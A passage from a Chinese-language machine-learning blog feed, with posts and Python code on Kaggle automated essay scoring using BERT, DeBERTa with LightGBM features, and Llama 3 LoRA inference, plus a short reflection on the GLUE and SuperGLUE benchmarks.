[ <span class="string">f&#x27;tfid_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]</span><br><span class="line">df.columns = tfid_columns</span><br><span class="line">df[<span class="string">&#x27;essay_id&#x27;</span>] = test_feats[<span class="string">&#x27;essay_id&#x27;</span>]</span><br><span class="line">test_feats = test_feats.merge(df, on=<span class="string">&#x27;essay_id&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CountVectorizer</span></span><br><span class="line">test_tfid = vectorizer_cnt.transform([i <span class="keyword">for</span> i <span class="keyword">in</span> test[<span class="string">&#x27;full_text&#x27;</span>]])</span><br><span class="line">dense_matrix = test_tfid.toarray()</span><br><span class="line">df = pd.DataFrame(dense_matrix)</span><br><span class="line">tfid_columns = [ <span class="string">f&#x27;tfid_cnt_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]</span><br><span class="line">df.columns = tfid_columns</span><br><span class="line">df[<span class="string">&#x27;essay_id&#x27;</span>] = test_feats[<span class="string">&#x27;essay_id&#x27;</span>]</span><br><span class="line">test_feats = test_feats.merge(df, on=<span class="string">&#x27;essay_id&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    test_feats[<span class="string">f&#x27;deberta_oof_<span class="subst">&#123;i&#125;</span>&#x27;</span>] = predicted_score[:, i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Features number</span></span><br><span class="line">feature_names = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;essay_id&#x27;</span>,<span class="string">&#x27;score&#x27;</span>], test_feats.columns))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Features number: &#x27;</span>,<span class="built_in">len</span>(feature_names))</span><br><span class="line">test_feats.head(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>计算概率</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">probabilities = []</span><br><span class="line"><span class="keyword">for</span> model <span class="keyword">in</span> models:</span><br><span class="line">    proba= model.predict(test_feats[feature_select])+ a</span><br><span class="line">    probabilities.append(proba)</span><br><span class="line"></span><br><span class="line">predictions = np.mean(probabilities, axis=<span class="number">0</span>)</span><br><span class="line">predictions = np.<span class="built_in">round</span>(predictions.clip(<span class="number">1</span>, <span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(predictions)</span><br><span class="line"></span><br><span class="line">submission=pd.read_csv(<span class="string">&quot;/kaggle/input/learning-agency-lab-automated-essay-scoring-2/sample_submission.csv&quot;</span>)</span><br><span class="line">submission[<span class="string">&#x27;score&#x27;</span>]=predictions</span><br><span class="line">submission[<span class="string">&#x27;score&#x27;</span>]=submission[<span class="string">&#x27;score&#x27;</span>].astype(<span class="built_in">int</span>)</span><br><span class="line">submission.to_csv(<span class="string">&quot;submission.csv&quot;</span>,index=<span class="literal">None</span>)</span><br><span class="line">display(submission.head())</span><br></pre></td></tr></table></figure><h3 id="update2024.05.22">update(2024.05.22)</h3><p>最新跟进, 可以调用另外一个competition的notebook来继续做feature extraction. 另一个notebook是<a href="https://www.kaggle.com/code/kojimar/fb3-deberta-family-inference-9-28-updated">FB3 Deberta Family Inference [9/28 UPDATED]</a></p><p>这个notebook做了文本的连贯性,词汇量,语法等层面的处理, 这里直接调用FB模型跑AES的train_data, 然后生成的数据作为feature+DeBERTa+LGBM做进一步学习, train结束后对testdata也做FB处理然后再做预测. 最后分数从0.82提升到了0.822.</p>]]></content>
      
      
      <categories>
          
          <category> ML NLP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SuperGLUE以及后续学习方向</title>
      <link href="/2024/05/03/SuperGLUE%E4%BB%A5%E5%8F%8A%E5%90%8E%E7%BB%AD%E5%AD%A6%E4%B9%A0%E6%96%B9%E5%90%91/"/>
      <url>/2024/05/03/SuperGLUE%E4%BB%A5%E5%8F%8A%E5%90%8E%E7%BB%AD%E5%AD%A6%E4%B9%A0%E6%96%B9%E5%90%91/</url>
      
        <content type="html"><![CDATA[<p>前面文本评分任务提供两种思路,一种llama3一种bert,但离线环境把bert的baseline交上去发现只有0.75的score,而leaderboard都是0.8起步了. 大概看了下, 发现很多的LGBM + deberta, 突然就有一种知识脱节的感觉.</p><p>去搜了一下deberta,然后发现这模型居然也出来两年了. 考虑到学完又是fall behind的可能,我觉得得找到一个benchmark能让我找到目前最新模型的情况.</p><p>大概看了下, 感觉<a href="https://gluebenchmark.com/">GLUE(General Language Understanding Evaluation)</a>和<a href="https://super.gluebenchmark.com/leaderboard">SuperGLUE</a>是NLP领域偏前沿的榜, 可以作为一个大致学习方向. 其次, 考虑到kaggle这种涉及金额的比赛哪怕我消息落后其他人也不会, 否则总会被卷下去, 所以总的来说LGBM+deberta应该最起码是一个有一些实力的组合.</p><p>不过总的来说, 更重要的是这些模型相对以前的模型做出了什么优化, roberta, deberta都对bert做了哪些层面的改进? 有没有新的hack? 出于什么考虑? 得到什么结果? 可能还存在哪些问题等等.</p><p>学习是一个长期的过程, 认识到自己的落后是很痛苦也很重要的一步, 能否认识到自己的愚蠢和跟上技术发展才是至关重要的一步.</p>]]></content>
      
      
      <categories>
          
          <category> ML NLP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kaggle-论文打分系统(bert,llama3思路)</title>
      <link href="/2024/05/02/Kaggle-%E8%AE%BA%E6%96%87%E6%89%93%E5%88%86%E7%B3%BB%E7%BB%9F-bert-llama3%E6%80%9D%E8%B7%AF/"/>
      <url>/2024/05/02/Kaggle-%E8%AE%BA%E6%96%87%E6%89%93%E5%88%86%E7%B3%BB%E7%BB%9F-bert-llama3%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>kaggle上还在开着的competition, 第一感觉是bert加下游监督学习就结束了, 但是后面看到有人用llama3加prompt加微调的思路来处理, 感觉很有意思, 记录一下. 数据大概如下</p><p><img src="head.png" /></p><p>首先任务类型: 给定text, 需要预测对应score, 考虑到score本身numerical, 加上官方的给定evaluation也是square(y_pred-y_true) 这个级别, 所以可以考虑是下游任务为regression的文本处理问题.</p><h2 id="bert">bert</h2><h3 id="指定path并查看head">指定path并查看head</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># linear algebra</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd <span class="comment"># data processing, CSV file I/O (e.g. pd.read_csv)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Input data files are available in the read-only &quot;../input/&quot; directory</span></span><br><span class="line"><span class="comment"># For example, running this (by clicking run or pressing Shift+Enter) will list all files under the input directory</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> dirname, _, filenames <span class="keyword">in</span> os.walk(<span class="string">&#x27;/kaggle/input&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        <span class="built_in">print</span>(os.path.join(dirname, filename))</span><br><span class="line"></span><br><span class="line">train_path = <span class="string">&#x27;/kaggle/input/learning-agency-lab-automated-essay-scoring-2/train.csv&#x27;</span></span><br><span class="line">test_path = <span class="string">&#x27;/kaggle/input/learning-agency-lab-automated-essay-scoring-2/test.csv&#x27;</span></span><br><span class="line">submission = <span class="string">&#x27;/kaggle/input/learning-agency-lab-automated-essay-scoring-2/sample_submission.csv&#x27;</span></span><br><span class="line"></span><br><span class="line">train_data = pd.read_csv(train_path)[[<span class="string">&#x27;full_text&#x27;</span>, <span class="string">&#x27;score&#x27;</span>]]</span><br><span class="line">test_data = pd.read_csv(test_path)[[<span class="string">&#x27;full_text&#x27;</span>]]</span><br><span class="line">train_data.head()</span><br></pre></td></tr></table></figure><h3 id="login-wandb">login wandb</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!pip install transformers datasets evaluate accelerate wandb</span><br><span class="line"><span class="keyword">import</span> wandb</span><br><span class="line"><span class="keyword">from</span> kaggle_secrets <span class="keyword">import</span> UserSecretsClient</span><br><span class="line">user_secrets = UserSecretsClient()</span><br><span class="line">wandb_token = user_secrets.get_secret(<span class="string">&quot;wandb_token&quot;</span>)</span><br><span class="line">! wandb login $wandb_token</span><br></pre></td></tr></table></figure><h3 id="preprocessing">preprocessing</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> Dataset</span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;distilbert/distilbert-base-uncased&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pre_processing</span>(<span class="params">example</span>):</span><br><span class="line">    <span class="keyword">return</span> tokenizer(example[<span class="string">&#x27;text&#x27;</span>], truncation=<span class="literal">True</span>, padding=<span class="string">&quot;max_length&quot;</span>, max_length=<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train_data = train_data.rename(columns=&#123;<span class="string">&#x27;full_text&#x27;</span>:<span class="string">&#x27;text&#x27;</span>&#125;)</span><br><span class="line">train_data = train_data.rename(columns=&#123;<span class="string">&#x27;score&#x27;</span>:<span class="string">&#x27;label&#x27;</span>&#125;)</span><br><span class="line">train_data[<span class="string">&#x27;label&#x27;</span>] = train_data[<span class="string">&#x27;label&#x27;</span>].astype(<span class="built_in">float</span>)</span><br><span class="line">test_data = test_data.rename(columns=&#123;<span class="string">&#x27;full_text&#x27;</span>:<span class="string">&#x27;text&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">train_df, val_df = train_test_split(train_data, test_size=<span class="number">.2</span>)</span><br><span class="line"></span><br><span class="line">train_dataset = Dataset.from_pandas(train_df)</span><br><span class="line">valid_dataset = Dataset.from_pandas(val_df)</span><br><span class="line">test_dataset = Dataset.from_pandas(test_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tokenized_train = train_dataset.<span class="built_in">map</span>(pre_processing, batched=<span class="literal">True</span>)</span><br><span class="line">tokenized_valid = valid_dataset.<span class="built_in">map</span>(pre_processing, batched=<span class="literal">True</span>)</span><br><span class="line">tokenized_test = test_dataset.<span class="built_in">map</span>(pre_processing, batched=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="指定evaluation">指定evaluation</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_absolute_error</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> r2_score</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_metrics_for_regression</span>(<span class="params">eval_pred</span>):</span><br><span class="line">    logits, labels = eval_pred</span><br><span class="line">    labels = labels.reshape(-<span class="number">1</span>)</span><br><span class="line">    mse = mean_squared_error(labels, logits)</span><br><span class="line">    mae = mean_absolute_error(labels, logits)</span><br><span class="line">    r2 = r2_score(labels, logits)</span><br><span class="line">    single_squared_errors = ((logits - labels).flatten()**<span class="number">2</span>).tolist()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Compute accuracy </span></span><br><span class="line">    <span class="comment"># Based on the fact that the rounded score = true score only if |single_squared_errors| &lt; 0.5</span></span><br><span class="line">    accuracy = <span class="built_in">sum</span>([<span class="number">1</span> <span class="keyword">for</span> e <span class="keyword">in</span> single_squared_errors <span class="keyword">if</span> e &lt; <span class="number">0.25</span>]) / <span class="built_in">len</span>(single_squared_errors)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;mse&quot;</span>: mse, <span class="string">&quot;mae&quot;</span>: mae, <span class="string">&quot;r2&quot;</span>: r2, <span class="string">&quot;accuracy&quot;</span>: accuracy&#125;</span><br></pre></td></tr></table></figure><h3 id="train">train</h3><p>注意num_labels = 1, bert里面做好了处理</p><p><img src="bert_regression.png" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForSequenceClassification, TrainingArguments, Trainer</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> DataCollatorWithPadding</span><br><span class="line"></span><br><span class="line">model = AutoModelForSequenceClassification.from_pretrained(<span class="string">&#x27;distilbert/distilbert-base-uncased&#x27;</span>, num_labels=<span class="number">1</span>)</span><br><span class="line">data_collator = DataCollatorWithPadding(tokenizer=tokenizer)</span><br><span class="line"></span><br><span class="line">training_args = TrainingArguments(</span><br><span class="line">    output_dir=<span class="string">&#x27;./essay_score&#x27;</span>,</span><br><span class="line">    learning_rate=<span class="number">2e-5</span>,</span><br><span class="line">    per_device_train_batch_size=<span class="number">16</span>,</span><br><span class="line">    per_device_eval_batch_size=<span class="number">16</span>,</span><br><span class="line">    num_train_epochs=<span class="number">2</span>,</span><br><span class="line">    weight_decay=<span class="number">0.01</span>,</span><br><span class="line">    evaluation_strategy=<span class="string">&#x27;epoch&#x27;</span>,</span><br><span class="line">    save_strategy=<span class="string">&#x27;epoch&#x27;</span>,</span><br><span class="line">    load_best_model_at_end=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RegressionTrainer</span>(<span class="title class_ inherited__">Trainer</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compute_loss</span>(<span class="params">self, model, inputs, return_outputs=<span class="literal">False</span></span>):</span><br><span class="line">        labels = inputs.pop(<span class="string">&quot;labels&quot;</span>)</span><br><span class="line">        outputs = model(**inputs)</span><br><span class="line">        logits = outputs[<span class="number">0</span>][:, <span class="number">0</span>]</span><br><span class="line">        loss = torch.nn.functional.mse_loss(logits, labels)</span><br><span class="line">        <span class="keyword">return</span> (loss, outputs) <span class="keyword">if</span> return_outputs <span class="keyword">else</span> loss</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">trainer = RegressionTrainer(</span><br><span class="line">    model=model,</span><br><span class="line">    args=training_args,</span><br><span class="line">    train_dataset=tokenized_train,</span><br><span class="line">    eval_dataset=tokenized_valid,</span><br><span class="line">    data_collator=data_collator,</span><br><span class="line">    compute_metrics = compute_metrics_for_regression,   </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">trainer.train()</span><br></pre></td></tr></table></figure><h3 id="简单test">简单test</h3><p>可以用validation_data</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">output = trainer.predict(tokenized_valid)</span><br><span class="line">res = <span class="built_in">list</span>(<span class="built_in">zip</span>(output.predictions.reshape(-<span class="number">1</span>).<span class="built_in">round</span>(),val_df[<span class="string">&#x27;label&#x27;</span>]))</span><br><span class="line">count = <span class="built_in">len</span>(res)</span><br><span class="line">true = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i==j:</span><br><span class="line">        true+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(true/count)</span><br><span class="line"><span class="built_in">list</span>(res)</span><br></pre></td></tr></table></figure><p><img src="res_bert.png" /></p><h2 id="生成模型微调策略">生成模型微调策略</h2><p>来源: <a href="https://www.kaggle.com/code/abdullahmeda/llama-3-8b-instruct-baseline-train">Llama 3 8b Instruct Baseline | Train</a></p><p>然后submission代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gc</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> peft <span class="keyword">import</span> PeftModel</span><br><span class="line"><span class="keyword">from</span> types <span class="keyword">import</span> SimpleNamespace</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForCausalLM</span><br><span class="line"></span><br><span class="line">torch.backends.cuda.enable_flash_sdp(<span class="literal">False</span>)</span><br><span class="line">torch.backends.cuda.enable_mem_efficient_sdp(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">args</span>):</span><br><span class="line">    config = SimpleNamespace(</span><br><span class="line">        data_dir = <span class="string">&#x27;/kaggle/input/learning-agency-lab-automated-essay-scoring-2&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    model     = AutoModelForCausalLM.from_pretrained(</span><br><span class="line">        args.model_pth,</span><br><span class="line">        torch_dtype=torch.bfloat16,</span><br><span class="line">        device_map=<span class="string">&quot;auto&quot;</span>,</span><br><span class="line">        trust_remote_code=<span class="literal">True</span>,</span><br><span class="line">    )</span><br><span class="line">    model     = PeftModel.from_pretrained(model, args.lora_pth)</span><br><span class="line">    tokenizer = AutoTokenizer.from_pretrained(args.model_pth, padding_side=<span class="string">&#x27;right&#x27;</span>) </span><br><span class="line">    tokenizer.pad_token = tokenizer.eos_token</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">preprocess</span>(<span class="params">sample, text=<span class="literal">False</span>, infer_mode=<span class="literal">False</span>, max_seq=args.max_length, return_tensors=<span class="literal">None</span></span>):</span><br><span class="line">        sys_prompt = <span class="string">&quot;Please read the following essay and assign a score of 1,2,3,4,5,6 where 6 is the best. Output only a single number with no explanation.\n\n&quot;</span></span><br><span class="line">        prompt = sample[<span class="string">&quot;full_text&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> infer_mode: answer = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>: answer = <span class="built_in">str</span>(sample[<span class="string">&quot;score&quot;</span>])</span><br><span class="line"></span><br><span class="line">        messages = [</span><br><span class="line">            &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: sys_prompt + prompt&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">f&quot;\n\nThe score is: &quot;</span> + answer&#125;</span><br><span class="line">        ]</span><br><span class="line">        formatted_sample = tokenizer.apply_chat_template(messages, tokenize=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> infer_mode: formatted_sample = formatted_sample.replace(<span class="string">&quot;&lt;|eot_id|&gt;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        tokenized_sample = tokenizer(formatted_sample, padding=<span class="literal">True</span>, return_tensors=return_tensors, </span><br><span class="line">                                     truncation=<span class="literal">True</span>, add_special_tokens=<span class="literal">False</span>, max_length=max_seq) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> return_tensors==<span class="string">&quot;pt&quot;</span>:</span><br><span class="line">            tokenized_sample[<span class="string">&quot;labels&quot;</span>] = tokenized_sample[<span class="string">&quot;input_ids&quot;</span>].clone()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tokenized_sample[<span class="string">&quot;labels&quot;</span>] = tokenized_sample[<span class="string">&quot;input_ids&quot;</span>].copy()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> text: <span class="keyword">return</span> formatted_sample</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> tokenized_sample</span><br><span class="line">    </span><br><span class="line">    df_test = pd.read_csv(<span class="string">f&#x27;<span class="subst">&#123;config.data_dir&#125;</span>/test.csv&#x27;</span>)</span><br><span class="line">    sub     = pd.read_csv(<span class="string">f&#x27;<span class="subst">&#123;config.data_dir&#125;</span>/sample_submission.csv&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    test_preds = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i,row <span class="keyword">in</span> tqdm(df_test.iterrows(), total=<span class="built_in">len</span>(df_test)):</span><br><span class="line"></span><br><span class="line">        tokenized_sample = preprocess(row, infer_mode=<span class="literal">True</span>, max_seq=args.max_length, return_tensors=<span class="string">&quot;pt&quot;</span>)</span><br><span class="line">        generated_ids = model.generate(**tokenized_sample.to(<span class="string">&#x27;cuda&#x27;</span>), max_new_tokens=<span class="number">2</span>,</span><br><span class="line">                                       pad_token_id=tokenizer.eos_token_id, do_sample=<span class="literal">False</span>)</span><br><span class="line">        decoded = tokenizer.batch_decode(generated_ids, skip_special_tokens=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            answer = decoded[<span class="number">0</span>].rsplit(<span class="string">&quot;The score is: &quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">            test_preds.append( <span class="built_in">int</span>(answer) )</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            test_preds.append( <span class="number">3</span> )</span><br><span class="line">            </span><br><span class="line">    sub.score = test_preds</span><br><span class="line">    sub.score = sub.score.astype(<span class="string">&#x27;int&#x27;</span>)</span><br><span class="line">    sub.to_csv(args.sub_pth, index=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">del</span> model, tokenizer</span><br><span class="line">    torch.cuda.empty_cache(); gc.collect()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--model_pth&quot;</span>,  <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Path to the pretrained model&quot;</span> )</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--lora_pth&quot;</span>,   <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Path to the PEFT LoRA adapter&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--sub_pth&quot;</span>,    <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Path to save submission file&quot;</span> )</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--max_length&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Max length of input sequence&quot;</span> )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(args)</span><br></pre></td></tr></table></figure><p>train部分大多数就是设置微调参数, 看submission相关可以发现主要思路就是让模型来回答问题:</p><p><code>Please read the following essay and assign a score of 1,2,3,4,5,6 where 6 is the best. Output only a single number with no explanation.</code></p><p>类似的, 我们应该也可以按之前unsloth微调的策略来做处理, 这份llama3微调最后测试结果是0.773.</p>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>langchain简单学习(2)-chatHistory</title>
      <link href="/2024/04/27/langchain%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0(2)-chatHistory/"/>
      <url>/2024/04/27/langchain%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0(2)-chatHistory/</url>
      
